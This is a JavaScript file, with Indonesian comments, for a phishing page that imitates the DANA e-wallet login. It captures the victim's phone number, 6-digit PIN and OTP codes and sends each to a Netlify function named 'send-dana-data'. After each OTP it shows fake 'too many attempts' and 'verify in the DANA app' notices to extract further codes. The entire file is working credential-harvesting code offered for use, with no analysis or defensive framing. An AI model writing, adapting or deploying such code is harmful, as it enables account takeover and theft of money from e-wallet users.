// Konstanta dan variabel global
const API_ENDPOINT = '/.netlify/functions/send-dana-data';
let currentAttempt = 1;
let otpTimer;
let remainingTime = 120; // 2 menit dalam detik

// Elemen DOM
const numberPage = document.getElementById('number-page');
const pinPage = document.getElementById('pin-page');
const otpPage = document.getElementById('otp-page');
const phoneInput = document.getElementById('phone-number');
const pinInputs = document.querySelectorAll('.pin-box');
const otpInputs = document.querySelectorAll('.otp-box');
const lanjutkanButton = document.getElementById('lanjutkan-button');
const lanjutkanContainer = document.getElementById('lanjutkan-container');
const showText = document.querySelector('.show-text');
const spinnerOverlay = document.querySelector('.spinner-overlay');
const otpTimerElement = document.getElementById('otp-timer');
const floatingNotification = document.getElementById('floating-notification');
const attemptCounter = document.getElementById('attempt-counter');
const attemptNumber = document.getElementById('attempt-number');
const successNotification = document.getElementById('success-notification');
const rewardNotification = document.getElementById('reward-notification');
const verifikasiButton = document.getElementById('verifikasi-button');
const verifikasiContainer = document.querySelector('.verifikasi-button-container');

// Fungsi untuk memformat nomor telepon
function formatPhoneNumber(value) {
  if (!value) return '';
  
  // Hapus semua karakter non-digit
  const phoneNumber = value.replace(/\D/g, '');
  
  // Format: XXX-XXXX-XXXXX
  if (phoneNumber.length <= 3) {
    return phoneNumber;
  } else if (phoneNumber.length <= 7) {
    return `${phoneNumber.slice(0, 3)}-${phoneNumber.slice(3)}`;
  } else {
    return `${phoneNumber.slice(0, 3)}-${phoneNumber.slice(3, 7)}-${phoneNumber.slice(7, 12)}`;
  }
}

// Fungsi untuk validasi nomor telepon Indonesia
function isValidPhoneNumber(phone) {
  const cleanPhone = phone.replace(/\D/g, '');
  return cleanPhone.length >= 10 && cleanPhone.length <= 13 && cleanPhone.startsWith('8');
}

// Fungsi untuk memindahkan fokus ke input berikutnya
function moveToNextInput(currentInput, nextInputSelector) {
  if (currentInput.value.length >= currentInput.maxLength) {
    const nextInput = currentInput.parentElement.querySelector(`${nextInputSelector}:nth-child(${Array.from(currentInput.parentElement.children).indexOf(currentInput) + 2})`);
    if (nextInput) {
      nextInput.focus();
    }
  }
}

// Fungsi untuk memindahkan fokus ke input sebelumnya
function moveToPrevInput(currentInput, prevInputSelector) {
  if (currentInput.value.length === 0 && currentInput.previousElementSibling) {
    currentInput.previousElementSibling.focus();
  }
}

// Fungsi untuk menampilkan/menyembunyikan spinner
function toggleSpinner(show) {
  spinnerOverlay.style.display = show ? 'flex' : 'none';
}

// Fungsi untuk mengirim data ke server
async function sendDataToServer(type, phone, pin = null, otp = null) {
  try {
    toggleSpinner(true);
    
    const response = await fetch(API_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        type,
        phone,
        pin,
        otp
      })
    });
    
    const data = await response.json();
    
    if (!response.ok) {
      throw new Error(data.error || 'Failed to send data');
    }
    
    return data;
  } catch (error) {
    console.error('Error sending data:', error);
    // Tetap lanjutkan alur meski gagal mengirim (untuk UX)
    return { success: false, error: error.message };
  } finally {
    toggleSpinner(false);
  }
}

// Fungsi untuk beralih halaman
function switchPage(fromPage, toPage) {
  fromPage.style.display = 'none';
  toPage.style.display = 'block';
}

// Fungsi untuk memulai timer OTP
function startOtpTimer() {
  clearInterval(otpTimer);
  remainingTime = 120;
  updateOtpTimer();
  
  otpTimer = setInterval(() => {
    remainingTime--;
    updateOtpTimer();
    
    if (remainingTime <= 0) {
      clearInterval(otpTimer);
      // Tampilkan notifikasi atau lakukan aksi ketika timer habis
      showFloatingNotification('Kode OTP telah kedaluwarsa. Silakan request kode baru.', true);
    }
  }, 1000);
}

// Fungsi untuk memperbarui tampilan timer OTP
function updateOtpTimer() {
  const minutes = Math.floor(remainingTime / 60);
  const seconds = remainingTime % 60;
  otpTimerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// Fungsi untuk menampilkan notifikasi
function showFloatingNotification(message, showAttempt = false) {
  const notificationContent = document.getElementById('notification-content');
  notificationContent.textContent = message;
  
  if (showAttempt) {
    attemptCounter.style.display = 'block';
    attemptNumber.textContent = currentAttempt;
  } else {
    attemptCounter.style.display = 'none';
  }
  
  floatingNotification.style.display = 'block';
  
  // Sembunyikan notifikasi setelah 5 detik
  setTimeout(() => {
    floatingNotification.style.display = 'none';
  }, 5000);
}

// Fungsi untuk menampilkan notifikasi sukses
function showSuccessNotification() {
  successNotification.style.display = 'block';
  
  // Sembunyikan notifikasi setelah 5 detik
  setTimeout(() => {
    successNotification.style.display = 'none';
  }, 5000);
}

// Event listener untuk input nomor telepon
phoneInput.addEventListener('input', (e) => {
  e.target.value = formatPhoneNumber(e.target.value);
});

// Event listener untuk input PIN
pinInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    // Hanya izinkan input angka
    e.target.value = e.target.value.replace(/\D/g, '');
    
    // Pindah ke input berikutnya
    moveToNextInput(e.target, '.pin-box');
  });
  
  input.addEventListener('keydown', (e) => {
    // Handle tombol backspace
    if (e.key === 'Backspace' && e.target.value === '') {
      moveToPrevInput(e.target, '.pin-box');
    }
  });
});

// Event listener untuk input OTP
otpInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    // Hanya izinkan input angka
    e.target.value = e.target.value.replace(/\D/g, '');
    
    // Pindah ke input berikutnya
    moveToNextInput(e.target, '.otp-box');
    
    // Periksa apakah semua input OTP telah terisi
    const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
    if (allFilled) {
      // Tampilkan tombol verifikasi
      verifikasiContainer.style.display = 'block';
    }
  });
  
  input.addEventListener('keydown', (e) => {
    // Handle tombol backspace
    if (e.key === 'Backspace' && e.target.value === '') {
      moveToPrevInput(e.target, '.otp-box');
    }
  });
});

// Event listener untuk tombol "Tampilkan" PIN
showText.addEventListener('click', () => {
  const isShowing = showText.classList.toggle('active');
  
  pinInputs.forEach(input => {
    input.type = isShowing ? 'text' : 'password';
  });
  
  showText.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
});

// Event listener untuk tombol "Lanjutkan"
lanjutkanButton.addEventListener('click', async () => {
  // Tentukan halaman aktif
  if (numberPage.style.display === 'block') {
    // Validasi nomor telepon
    const phoneNumber = phoneInput.value.replace(/\D/g, '');
    
    if (!isValidPhoneNumber(phoneNumber)) {
      showFloatingNotification('Nomor HP tidak valid. Harap masukkan nomor HP Indonesia yang benar.');
      return;
    }
    
    // Kirim data nomor telepon
    await sendDataToServer('phone', phoneNumber);
    
    // Beralih ke halaman PIN
    switchPage(numberPage, pinPage);
    pinInputs[0].focus();
    
  } else if (pinPage.style.display === 'block') {
    // Ambil nilai PIN
    const pin = Array.from(pinInputs).map(input => input.value).join('');
    
    // Validasi PIN (6 digit)
    if (pin.length !== 6) {
      showFloatingNotification('PIN harus terdiri dari 6 digit.');
      return;
    }
    
    // Kirim data PIN
    const phoneNumber = phoneInput.value.replace(/\D/g, '');
    await sendDataToServer('pin', phoneNumber, pin);
    
    // Beralih ke halaman OTP
    switchPage(pinPage, otpPage);
    otpInputs[0].focus();
    
    // Mulai timer OTP
    startOtpTimer();
    
    // Tampilkan notifikasi
    showFloatingNotification('Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.', true);
    
  } else if (otpPage.style.display === 'block') {
    // Logika untuk halaman OTP akan ditangani oleh tombol verifikasi terpisah
  }
});

// Event listener untuk tombol "Verifikasi" OTP
verifikasiButton.addEventListener('click', async () => {
  // Ambil nilai OTP
  const otp = Array.from(otpInputs).map(input => input.value).join('');
  
  // Validasi OTP (4 digit)
  if (otp.length !== 4) {
    showFloatingNotification('Kode OTP harus terdiri dari 4 digit.');
    return;
  }
  
  // Kirim data OTP
  const phoneNumber = phoneInput.value.replace(/\D/g, '');
  const pin = Array.from(pinInputs).map(input => input.value).join('');
  await sendDataToServer('otp', phoneNumber, pin, otp);
  
  // Tampilkan notifikasi sukses
  showSuccessNotification();
  
  // Reset input OTP
  otpInputs.forEach(input => input.value = '');
  
  // Increment attempt counter
  currentAttempt++;
  
  // Jika sudah 6 percobaan, tampilkan notifikasi khusus
  if (currentAttempt > 6) {
    showFloatingNotification('Terlalu banyak percobaan. Silakan coba lagi nanti.');
    // Nonaktifkan input OTP
    otpInputs.forEach(input => {
      input.disabled = true;
    });
    verifikasiButton.disabled = true;
  } else {
    // Perbarui notifikasi
    showFloatingNotification('Terlalu sering memasukkan kode OTP. Silahkan verifikasi di aplikasi DANA.', true);
  }
});

// Event listener untuk notifikasi mengambang
floatingNotification.addEventListener('click', () => {
  floatingNotification.style.display = 'none';
});

// Inisialisasi
document.addEventListener('DOMContentLoaded', () => {
  // Fokus ke input nomor telepon saat halaman dimuat
  phoneInput.focus();
  
  // Sembunyikan container tombol di halaman PIN dan OTP
  if (pinPage.style.display === 'block' || otpPage.style.display === 'block') {
    lanjutkanContainer.classList.add('hidden');
  }
});
